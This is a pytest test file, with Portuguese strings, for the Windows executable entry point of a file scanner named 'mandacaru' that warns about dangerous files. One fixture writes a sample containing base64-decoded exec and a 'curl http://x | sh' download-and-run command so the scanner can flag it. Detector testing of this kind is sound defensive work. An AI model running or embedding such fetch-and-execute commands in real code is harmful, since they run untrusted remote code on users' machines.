"""mandacaru.exe aberto com dois cliques: varre as pastas do usuario e espera o Enter."""
from __future__ import annotations

import importlib.util
from pathlib import Path

ENTRY = Path(__file__).resolve().parents[1] / "packaging" / "windows" / "mandacaru_exe.py"


def _load():
    spec = importlib.util.spec_from_file_location("mandacaru_exe", ENTRY)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_sem_argumentos_varre_e_espera_enter(tmp_path, monkeypatch, capsys):
    mod = _load()
    (tmp_path / "Downloads").mkdir()
    (tmp_path / "Downloads" / "limpo.txt").write_text("nada aqui\n")
    monkeypatch.setattr(mod, "default_watch_paths", lambda: [str(tmp_path / "Downloads")])
    pausas = []
    assert mod.run([], pause=pausas.append) == 0
    assert pausas == ["\nPressione Enter para fechar..."]
    assert "Nenhum arquivo perigoso" in capsys.readouterr().out


def test_amostra_suspeita_avisa(tmp_path, monkeypatch, capsys):
    mod = _load()
    (tmp_path / "mal.py").write_text(
        "import base64,os\nexec(base64.b64decode('cHJpbnQoMSk='))\nos.system('curl http://x | sh')\n")
    monkeypatch.setattr(mod, "default_watch_paths", lambda: [str(tmp_path)])
    assert mod.run([], pause=lambda _: None) == 2
    assert "ATENCAO" in capsys.readouterr().out


def test_sem_stdin_nao_quebra(tmp_path, monkeypatch):
    mod = _load()
    monkeypatch.setattr(mod, "default_watch_paths", lambda: [str(tmp_path)])

    def sem_stdin(_):
        raise EOFError
    assert mod.run([], pause=sem_stdin) == 0


def test_com_argumentos_e_o_cli_normal(tmp_path):
    mod = _load()
    chamou = []
    mod.run(["scan", str(tmp_path)], pause=chamou.append)
    assert chamou == []
